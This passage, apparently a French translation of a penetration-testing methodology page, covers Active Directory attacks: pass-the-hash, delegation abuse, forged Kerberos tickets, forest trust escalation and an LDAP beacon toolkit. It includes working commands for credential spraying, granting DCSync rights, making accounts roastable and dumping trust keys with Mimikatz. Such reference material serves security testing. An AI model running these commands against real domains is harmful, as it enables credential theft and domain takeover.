Si vous pouvez **accéder à d'autres PC ou partages**, vous pourriez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont consultés d'une manière ou d'une autre, **déclencheront une authentification NTLM contre vous**, afin que vous puissiez **voler** le **NTLM challenge** pour le casser :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Cette vulnérabilité permettait à tout utilisateur authentifié de **compromettre le contrôleur de domaine**.


{{#ref}}
printnightmare.md
{{#endref}}

## Élévation de privilèges sur Active Directory AVEC des identifiants/une session privilégiés

**Pour les techniques suivantes, un utilisateur de domaine standard ne suffit pas ; vous avez besoin de privilèges/identifiants spéciaux pour effectuer ces attaques.**

### Hash extraction

Avec un peu de chance, vous avez réussi à **compromettre** un compte **d'administrateur local** en utilisant [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), notamment via le relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [l'escalade de privilèges en local](../windows-local-privilege-escalation/index.html).\
Ensuite, il est temps d'extraire tous les hash présents en mémoire et localement.\
[**Consultez cette page au sujet des différentes méthodes permettant d'obtenir les hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Une fois que vous disposez du hash d'un utilisateur**, vous pouvez l'utiliser pour **vous faire passer pour lui**.\
Vous devez utiliser un **outil** qui **effectuera** l'**authentification NTLM en utilisant** ce **hash**, **ou** vous pouvez créer une nouvelle **sessionlogon** et **injecter** ce **hash** dans **LSASS**, afin que, lorsqu'une **authentification NTLM est effectuée**, ce **hash soit utilisé**. C'est la dernière option qu'utilise mimikatz.\
[**Consultez cette page pour plus d'informations.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cette attaque vise à **utiliser le hash NTLM de l'utilisateur pour demander des tickets Kerberos**, comme alternative au Pass The Hash classique via le protocole NTLM. Elle peut donc être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où seul **Kerberos est autorisé** comme protocole d'authentification.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Dans la méthode d'attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d'authentification d'un utilisateur** au lieu de son mot de passe ou de ses valeurs de hash. Ce ticket volé est ensuite utilisé pour **se faire passer pour l'utilisateur**, afin d'obtenir un accès non autorisé aux ressources et services du réseau.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si vous disposez du **hash** ou du **mot de passe** d'un **administrateu**r** local**, vous devriez essayer de vous **connecter localement** à d'autres **PC** avec celui-ci.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Notez que ceci est assez **bruyant** et que **LAPS** permettrait de l’**atténuer**.

### Abuse de MSSQL et liens de confiance

Si un utilisateur dispose des privilèges nécessaires pour **accéder à des instances MSSQL**, il pourrait les utiliser pour **exécuter des commandes** sur l’hôte MSSQL (s’il s’exécute en tant que SA), **voler** le **hash** NetNTLM ou même effectuer une **attaque** de **relay**.\
Si une instance MSSQL est approuvée par une autre instance via un lien de base de données, un utilisateur disposant de privilèges sur la base de données liée pourrait être en mesure d’**utiliser la relation de confiance pour exécuter des requêtes sur l’autre instance**. Ces relations de confiance peuvent être chaînées et peuvent éventuellement atteindre une base de données mal configurée où l’utilisateur peut exécuter des commandes.\
**Les liens entre les bases de données fonctionnent même à travers les relations de confiance entre forêts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuse des plateformes de gestion des actifs et de déploiement IT

Les suites tierces d’inventaire et de déploiement exposent souvent des voies puissantes vers les identifiants et l’exécution de code. Voir :

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si vous trouvez un objet Computer avec l’attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) et que vous disposez de privilèges de domaine sur l’ordinateur, vous pourrez extraire de la mémoire les TGT de tous les utilisateurs qui se connectent à l’ordinateur.\
Ainsi, si un **Domain Admin se connecte à l’ordinateur**, vous pourrez extraire son TGT et l’usurper à l’aide de [Pass the Ticket](pass-the-ticket.md).\
Grâce à la constrained delegation, vous pourriez même **compromettre automatiquement un Print Server** (avec un peu de chance, ce sera un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un utilisateur ou un ordinateur est autorisé pour la "Constrained Delegation", il pourra **usurper l’identité de n’importe quel utilisateur pour accéder à certains services sur un ordinateur**.\
Ainsi, si vous **compromettez le hash** de cet utilisateur/ordinateur, vous pourrez **usurper l’identité de n’importe quel utilisateur** (même des domain admins) pour accéder à certains services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Disposer du privilège **WRITE** sur un objet Active Directory d’un ordinateur distant permet d’obtenir une exécution de code avec des **privilèges élevés** :


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuse des permissions/ACLs

L’utilisateur compromis pourrait disposer de **privilèges intéressants sur certains objets du domaine**, ce qui pourrait vous permettre de **vous déplacer** latéralement/**d’élever** vos privilèges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuse du service Printer Spooler

La découverte d’un **service Spool en écoute** au sein du domaine peut être **exploitée** pour **obtenir de nouveaux identifiants** et **élever ses privilèges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuse des sessions de tiers

Si **d’autres utilisateurs** **accèdent** à la machine **compromise**, il est possible de **récupérer des identifiants en mémoire** et même d’**injecter des beacons dans leurs processus** pour les usurper.\
Les utilisateurs accèdent généralement au système via RDP ; voici donc comment effectuer quelques attaques sur les sessions RDP de tiers :


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fournit un système de gestion du **mot de passe de l’Administrator local** sur les ordinateurs joints au domaine, en garantissant qu’il est **randomisé**, unique et **modifié** fréquemment. Ces mots de passe sont stockés dans Active Directory et leur accès est contrôlé par des ACLs afin de le limiter aux utilisateurs autorisés. Avec des permissions suffisantes pour accéder à ces mots de passe, il devient possible de pivoter vers d’autres ordinateurs.


{{#ref}}
laps.md
{{#endref}}

### Vol de certificats

La **récupération de certificats** depuis la machine compromise peut permettre d’élever ses privilèges au sein de l’environnement :


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuse des modèles de certificats

Si des **modèles vulnérables** sont configurés, il est possible de les exploiter pour élever ses privilèges :


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation avec un compte doté de privilèges élevés

### Extraction des identifiants du domaine

Une fois que vous avez obtenu les privilèges **Domain Admin**, ou mieux encore **Enterprise Admin**, vous pouvez **extraire** la **base de données du domaine** : _ntds.dit_.

[**Vous trouverez ici plus d’informations sur l’attaque DCSync**](dcsync.md).

[**Vous trouverez ici plus d’informations sur le vol de NTDS.dit**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc comme mécanisme de persistance

Certaines techniques présentées précédemment peuvent être utilisées pour assurer la persistance.\
Par exemple, vous pourriez :

- Rendre les utilisateurs vulnérables à [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendre les utilisateurs vulnérables à [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Accorder les privilèges [**DCSync**](#dcsync) à un utilisateur

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L’**attaque Silver Ticket** crée un ticket **Ticket Granting Service (TGS)** **légitime** pour un service spécifique en utilisant le **hash NTLM** (par exemple, le **hash du compte de l’ordinateur**). Cette méthode est utilisée pour **accéder aux privilèges du service**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Une **attaque Golden Ticket** consiste, pour un attaquant, à obtenir le **hash NTLM du compte krbtgt** dans un environnement Active Directory (AD). Ce compte est particulier, car il sert à signer tous les **Ticket Granting Tickets (TGTs)**, essentiels à l’authentification au sein du réseau AD.

Une fois ce hash obtenu, l’attaquant peut créer des **TGTs** pour n’importe quel compte de son choix (attaque Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ils sont similaires aux golden tickets, mais forgés de manière à **contourner les mécanismes courants de détection des golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistance de compte par certificats**

**Posséder les certificats d’un compte ou être capable d’en demander** constitue une très bonne méthode pour assurer la persistance dans le compte de l’utilisateur (même s’il modifie son mot de passe) :


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistance de domaine par certificats**

**L’utilisation de certificats permet également d’assurer la persistance avec des privilèges élevés au sein du domaine :**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Groupe AdminSDHolder

L’objet **AdminSDHolder** dans Active Directory garantit la sécurité des **groupes privilégiés** (comme Domain Admins et Enterprise Admins) en appliquant une **Access Control List (ACL)** standard à ces groupes afin d’empêcher les modifications non autorisées. Cependant, cette fonctionnalité peut être exploitée : si un attaquant modifie l’ACL d’AdminSDHolder pour accorder un accès complet à un utilisateur standard, celui-ci obtient un contrôle étendu sur tous les groupes privilégiés. Cette mesure de sécurité, destinée à protéger l’environnement, peut donc se retourner contre lui et permettre un accès injustifié si elle n’est pas surveillée attentivement.

[**Vous trouverez ici plus d’informations sur le groupe AdminDSHolder.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Identifiants DSRM

Dans chaque **Domain Controller (DC)**, il existe un compte d’**administrateur local**. En obtenant des droits d’administration sur une telle machine, le hash de l’Administrator local peut être extrait à l’aide de **mimikatz**. Ensuite, une modification du registre est nécessaire pour **activer l’utilisation de ce mot de passe**, ce qui permet l’accès à distance au compte Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistance par ACL

Vous pourriez **accorder** certaines **permissions spéciales** à un **utilisateur** sur certains objets spécifiques du domaine, ce qui lui permettrait d’**élever ses privilèges ultérieurement**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Descripteurs de sécurité

Les **descripteurs de sécurité** servent à **stocker** les **permissions** qu’un **objet** possède **sur** un **objet**. Si vous pouvez simplement **apporter** une **petite modification** au **descripteur de sécurité** d’un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d’être membre d’un groupe privilégié.


{{#ref}}
security-descriptors.md
{{#endref}}

### Objets dynamiques : anti-forensics / évasion

Exploitez la classe auxiliaire `dynamicObject` pour créer des principaux/GPOs/enregistrements DNS à courte durée de vie avec `entryTTL`/`msDS-Entry-Time-To-Die` ; ils s’auto-suppriment sans tombstones, effaçant les traces LDAP tout en laissant des SID orphelins, des références `gPLink` brisées ou des réponses DNS mises en cache (par exemple, une pollution des ACEs d’AdminSDHolder ou des redirections `gPCFileSysPath`/DNS intégrées à AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifier **LSASS** en mémoire afin d’établir un **mot de passe universel**, permettant l’accès à tous les comptes du domaine.


{{#ref}}
skeleton-key.md
{{#endref}}

### SSP personnalisé

[Découvrez ici ce qu’est un SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** afin de **capturer en clair** les **identifiants** utilisés pour accéder à la machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Il enregistre un **nouveau Domain Controller** dans l’AD et l’utilise pour **injecter des attributs** (SIDHistory, SPNs...) sur des objets spécifiés **sans laisser de journaux** concernant les **modifications**. Vous **devez disposer des privilèges DA** et vous trouver dans le **domaine racine**.\
Notez que si vous utilisez des données incorrectes, des journaux particulièrement compromettants apparaîtront.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistance par LAPS

Nous avons précédemment expliqué comment élever ses privilèges si vous disposez de **permissions suffisantes pour lire les mots de passe LAPS**. Cependant, ces mots de passe peuvent également être utilisés pour **maintenir la persistance**.\
Voir :


{{#ref}}
laps.md
{{#endref}}

## Élévation de privilèges dans la forêt - Relations de confiance entre domaines

Microsoft considère la **forêt** comme la limite de sécurité. Cela implique que la **compromission d’un seul domaine pourrait potentiellement entraîner la compromission de toute la forêt**.<sup>[[1]](#references)</sup>

### Informations de base

Une [**relation de confiance entre domaines**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) est un mécanisme de sécurité qui permet à un utilisateur d’un **domaine** d’accéder aux ressources d’un autre **domaine**. Elle crée essentiellement un lien entre les systèmes d’authentification des deux domaines, permettant aux vérifications d’authentification de circuler de manière transparente. Lorsque les domaines établissent une relation de confiance, ils échangent et conservent des **clés** spécifiques au sein de leurs **Domain Controllers (DCs)**, essentielles à l’intégrité de cette relation.

Dans un scénario classique, si un utilisateur souhaite accéder à un service dans un **domaine de confiance**, il doit d’abord demander un ticket spécial, appelé **inter-realm TGT**, au DC de son propre domaine. Ce TGT est chiffré avec une **clé** partagée convenue par les deux domaines. L’utilisateur présente ensuite ce TGT au **DC du domaine de confiance** afin d’obtenir un ticket de service (**TGS**). Après validation réussie de l’inter-realm TGT par le DC du domaine de confiance, celui-ci émet un TGS accordant à l’utilisateur l’accès au service.

**Étapes** :

1. Un **ordinateur client** du **Domaine 1** commence le processus en utilisant son **hash NTLM** pour demander un **Ticket Granting Ticket (TGT)** à son **Domain Controller (DC1)**.
2. DC1 émet un nouveau TGT si l’authentification du client réussit.
3. Le client demande ensuite un **inter-realm TGT** à DC1, nécessaire pour accéder aux ressources du **Domaine 2**.
4. L’inter-realm TGT est chiffré avec une **clé de confiance** partagée entre DC1 et DC2 dans le cadre de la relation de confiance bidirectionnelle entre les domaines.
5. Le client transmet l’inter-realm TGT au **Domain Controller (DC2) du Domaine 2**.
6. DC2 vérifie l’inter-realm TGT à l’aide de sa clé de confiance partagée et, si celui-ci est valide, émet un **Ticket Granting Service (TGS)** pour le serveur du Domaine 2 auquel le client souhaite accéder.
7. Enfin, le client présente ce TGS au serveur. Celui-ci est chiffré avec le hash du compte du serveur afin d’obtenir l’accès au service du Domaine 2.

### Différentes relations de confiance

Il est important de noter qu’**une relation de confiance peut être unidirectionnelle ou bidirectionnelle**. Dans le cas bidirectionnel, les deux domaines se font confiance. Dans une relation **unidirectionnelle**, l’un des domaines est le domaine **trusted** et l’autre le domaine **trusting**. Dans ce dernier cas, **vous ne pourrez accéder aux ressources du domaine trusting que depuis le domaine trusted**.

Si le Domaine A fait confiance au Domaine B, A est le domaine trusting et B le domaine trusted. De plus, dans le **Domaine A**, il s’agit d’une **relation de confiance sortante** (*Outbound trust*) ; et dans le **Domaine B**, d’une **relation de confiance entrante** (*Inbound trust*).

**Différentes relations de confiance**

- **Parent-Child Trusts** : Il s’agit d’une configuration courante au sein d’une même forêt, dans laquelle un domaine enfant dispose automatiquement d’une relation de confiance transitive bidirectionnelle avec son domaine parent. Cela signifie essentiellement que les demandes d’authentification peuvent circuler de manière transparente entre le parent et l’enfant.
- **Cross-link Trusts** : Également appelées "shortcut trusts", elles sont établies entre des domaines enfants afin d’accélérer les processus de referral. Dans les forêts complexes, les referrals d’authentification doivent généralement remonter jusqu’à la racine de la forêt, puis redescendre vers le domaine cible. La création de cross-links raccourcit ce trajet, ce qui est particulièrement utile dans les environnements géographiquement dispersés.
- **External Trusts** : Elles sont configurées entre des domaines différents et sans lien, et sont par nature non transitives. Selon la [documentation de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), les external trusts sont utiles pour accéder aux ressources d’un domaine situé en dehors de la forêt actuelle et qui n’est pas connecté par une forest trust. La sécurité est renforcée grâce au filtrage des SID avec les external trusts.
- **Tree-root Trusts** : Ces relations sont automatiquement établies entre le domaine racine de la forêt et une nouvelle racine d’arborescence ajoutée. Bien qu’elles soient peu courantes, les tree-root trusts sont importantes pour ajouter de nouvelles arborescences de domaines à une forêt, leur permettant de conserver un nom de domaine unique tout en garantissant la transitivité bidirectionnelle. Vous trouverez plus d’informations dans le [guide de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts** : Ce type de relation est une relation de confiance transitive bidirectionnelle entre deux domaines racine de forêt, qui applique également un filtrage des SID afin de renforcer les mesures de sécurité.
- **MIT Trusts** : Ces relations sont établies avec des domaines Kerberos non-Windows conformes à la [RFC4120](https://tools.ietf.org/html/rfc4120). Les MIT trusts sont un peu plus spécialisées et s’adressent aux environnements nécessitant une intégration avec des systèmes basés sur Kerberos en dehors de l’écosystème Windows.

#### Autres différences entre les **relations de confiance**

- Une relation de confiance peut également être **transitive** (A fait confiance à B, B fait confiance à C, donc A fait confiance à C) ou **non transitive**.
- Une relation de confiance peut être configurée comme **bidirectionnelle** (les deux domaines se font confiance) ou **unidirectionnelle** (un seul des deux fait confiance à l’autre).

### Chemin d’attaque

1. **Énumérer** les relations de confiance
2. Vérifier si un **principal de sécurité** (utilisateur/groupe/ordinateur) a **accès** aux ressources de l’**autre domaine**, éventuellement via des entrées ACE ou parce qu’il appartient à des groupes de l’autre domaine. Rechercher les **relations entre domaines** (c’est probablement la raison pour laquelle la relation de confiance a été créée).
1. Le kerberoast peut également être une option dans ce cas.
3. **Compromettre** les **comptes** capables de **pivoter** entre les domaines.

Les attaquants pouvant accéder aux ressources d’un autre domaine disposent de trois mécanismes principaux :

- **Appartenance à des groupes locaux** : Des principaux peuvent être ajoutés à des groupes locaux sur des machines, comme le groupe “Administrators” d’un serveur, ce qui leur accorde un contrôle important sur cette machine.
- **Appartenance à un groupe d’un domaine étranger** : Les principaux peuvent également être membres de groupes au sein du domaine étranger. Toutefois, l’efficacité de cette méthode dépend de la nature de la relation de confiance et de la portée du groupe.
- **Access Control Lists (ACLs)** : Des principaux peuvent être spécifiés dans une **ACL**, notamment comme entités dans des **ACEs** au sein d’une **DACL**, ce qui leur fournit un accès à des ressources spécifiques. Pour approfondir le fonctionnement des ACLs, DACLs et ACEs, le livre blanc intitulé “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” constitue une ressource précieuse.<sup>[[17]](#references)</sup>

### Trouver les utilisateurs/groupes externes disposant de permissions

Vous pouvez vérifier **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** afin de trouver les principaux de sécurité étrangers dans le domaine. Il s’agira d’utilisateurs/groupes provenant d’**un domaine/une forêt externe**.

Vous pouvez vérifier cela dans **Bloodhound** ou à l’aide de powerview :
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Élévation de privilèges de la forêt Child-to-Parent
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Autres moyens d’énumérer les relations d’approbation de domaine :
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Il existe **2 clés de confiance**, l'une pour _Child --> Parent_ et l'autre pour _Parent_ --> _Child_.\
> Vous pouvez récupérer celle utilisée par le domaine actuel avec :
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Élevez vos privilèges au rang d'Enterprise admin dans le domaine enfant/parent en abusant de la confiance avec SID-History injection :


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Il est essentiel de comprendre comment le Configuration Naming Context (NC) peut être exploité. Le Configuration NC sert de référentiel central pour les données de configuration dans l'ensemble d'une forêt au sein des environnements Active Directory (AD). Ces données sont répliquées vers chaque Domain Controller (DC) de la forêt, les DC inscriptibles conservant une copie inscriptible du Configuration NC. Pour exploiter cela, il faut disposer de **privilèges SYSTEM sur un DC**, de préférence un DC enfant.

**Lier une GPO au site du DC racine**

Le conteneur Sites du Configuration NC contient des informations sur les sites de tous les ordinateurs joints au domaine dans la forêt AD. En disposant de privilèges SYSTEM sur n'importe quel DC, les attaquants peuvent lier des GPO aux sites des DC racine. Cette action peut compromettre le domaine racine en manipulant les stratégies appliquées à ces sites.

Pour obtenir des informations approfondies, consultez les recherches sur le [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromettre n'importe quel gMSA de la forêt**

Un vecteur d'attaque consiste à cibler les gMSA privilégiés du domaine. La clé racine KDS, essentielle au calcul des mots de passe des gMSA, est stockée dans le Configuration NC. Avec des privilèges SYSTEM sur n'importe quel DC, il est possible d'accéder à la clé racine KDS et de calculer les mots de passe de n'importe quel gMSA dans toute la forêt.

Une analyse détaillée et des instructions étape par étape sont disponibles dans :


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attaque MSA déléguée complémentaire (BadSuccessor – abus des attributs de migration) :


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Recherche externe complémentaire : [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Attaque par modification du Schema**

Cette méthode nécessite de la patience, en attendant la création de nouveaux objets AD privilégiés. Avec des privilèges SYSTEM, un attaquant peut modifier l'AD Schema afin d'accorder à n'importe quel utilisateur un contrôle total sur toutes les classes. Cela pourrait permettre un accès et un contrôle non autorisés sur les objets AD nouvellement créés.

Pour aller plus loin, consultez [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA à EA avec ADCS ESC5**

La vulnérabilité ADCS ESC5 cible le contrôle des objets Public Key Infrastructure (PKI) afin de créer un certificate template permettant de s'authentifier en tant que n'importe quel utilisateur de la forêt. Comme les objets PKI se trouvent dans le Configuration NC, la compromission d'un DC enfant inscriptible permet d'exécuter des attaques ESC5.

Plus de détails sont disponibles dans [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Dans les scénarios sans ADCS, l'attaquant peut configurer les composants nécessaires, comme indiqué dans [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domaine de forêt externe - One-Way (Inbound) ou bidirectionnel
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Dans ce scénario, **votre domaine est approuvé** par un domaine externe qui vous accorde des **autorisations indéterminées** sur celui-ci. Vous devrez déterminer **quelles entités principales de votre domaine disposent de quels accès au domaine externe**, puis tenter de les exploiter :


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domaine d’une forêt externe - Unidirectionnel (sortant)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Dans ce scénario, **votre domaine** fait **confiance** à certains **privilèges** accordés à un principal provenant d’**un autre domaine**.

Cependant, lorsqu’un **domaine est approuvé** par le domaine qui lui fait confiance, le domaine approuvé **crée un utilisateur** avec un **nom prévisible** et utilise comme **mot de passe le mot de passe du domaine approuvé**. Cela signifie qu’il est possible d’**accéder à un utilisateur du domaine qui fait confiance pour entrer dans le domaine approuvé**, l’énumérer et tenter d’augmenter davantage ses privilèges :


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Une autre manière de compromettre le domaine approuvé consiste à trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans la **direction opposée** à celle de la relation d’approbation entre les domaines (ce qui n’est pas très courant).

Une autre manière de compromettre le domaine approuvé consiste à attendre sur une machine à laquelle **un utilisateur du domaine approuvé peut accéder** afin de se connecter via **RDP**. L’attaquant pourrait alors injecter du code dans le processus de la session RDP et **accéder au domaine d’origine de la victime** depuis celui-ci.\
De plus, si la **victime a monté son disque dur**, l’attaquant pourrait, depuis le processus de la **session RDP**, déposer des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique s’appelle **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigation de l’abus des relations d’approbation entre domaines

### **SID Filtering :**

- Le risque d’attaques exploitant l’attribut SID history entre les approbations de forêts est atténué par SID Filtering, activé par défaut sur toutes les approbations inter-forêts. Cela repose sur l’hypothèse que les approbations intra-forêt sont sécurisées, la forêt — plutôt que le domaine — étant considérée comme la limite de sécurité, conformément à la position de Microsoft.
- Cependant, il existe un inconvénient : SID Filtering peut perturber les applications et l’accès des utilisateurs, ce qui entraîne parfois sa désactivation.

### **Selective Authentication :**

- Pour les approbations inter-forêts, l’utilisation de Selective Authentication garantit que les utilisateurs des deux forêts ne sont pas automatiquement authentifiés. Des autorisations explicites sont plutôt nécessaires pour que les utilisateurs puissent accéder aux domaines et aux serveurs de la forêt ou du domaine qui fait confiance.
- Il est important de noter que ces mesures ne protègent pas contre l’exploitation du Writable Configuration Naming Context (NC) ni contre les attaques visant le compte d’approbation.

[**Plus d’informations sur les relations d’approbation entre domaines sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abus d’AD basé sur LDAP depuis des implants on-host

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) réimplémente des primitives LDAP de type bloodyAD sous forme de Beacon Object Files x64 qui s’exécutent entièrement à l’intérieur d’un implant on-host (par exemple, Adaptix C2). Les opérateurs compilent le pack avec `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, chargent `ldap.axs`, puis exécutent `ldap <subcommand>` depuis le beacon. Tout le trafic utilise le contexte de sécurité de la session d’ouverture de session actuelle via LDAP (389), avec signature/chiffrement, ou via LDAPS (636), avec confiance automatique dans le certificat ; aucun proxy socks ni artefact sur disque n’est donc requis.<sup>[[4]](#references)</sup>

### Énumération LDAP côté implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` et `get-groupmembers` convertissent les noms courts/chemins OU en DN complets et extraient les objets correspondants.
- `get-object`, `get-attribute` et `get-domaininfo` récupèrent des attributs arbitraires (y compris les descripteurs de sécurité), ainsi que les métadonnées de la forêt et du domaine depuis `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` et `get-rbcd` exposent directement depuis LDAP les candidats au roasting, les paramètres de délégation et les descripteurs existants de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` et `get-writable --detailed` analysent la DACL afin de répertorier les trustees, les droits (GenericAll/WriteDACL/WriteOwner/écritures d’attributs) et l’héritage, fournissant immédiatement des cibles pour l’escalade de privilèges via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitives d’écriture LDAP pour l’escalade et la persistance

- Les BOFs de création d’objets (`add-user`, `add-computer`, `add-group`, `add-ou`) permettent à l’opérateur de préparer de nouveaux principals ou comptes machine partout où des droits sur les OU existent. `add-groupmember`, `set-password`, `add-attribute` et `set-attribute` permettent de détourner directement des cibles une fois les droits WriteProperty identifiés.
- Les commandes axées sur les ACL, telles que `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` et `add-dcsync`, transforment les droits WriteDACL/WriteOwner sur n’importe quel objet AD en réinitialisations de mots de passe, contrôle de l’appartenance aux groupes ou privilèges de réplication DCSync, sans laisser d’artefacts PowerShell/ADSI. Les équivalents `remove-*` nettoient les ACE injectées.

### Délégation, roasting et abus de Kerberos

- `add-spn`/`set-spn` rendent instantanément un utilisateur compromis vulnérable au Kerberoasting ; `add-asreproastable` (bascule UAC) le marque comme cible d’AS-REP roasting sans toucher au mot de passe.
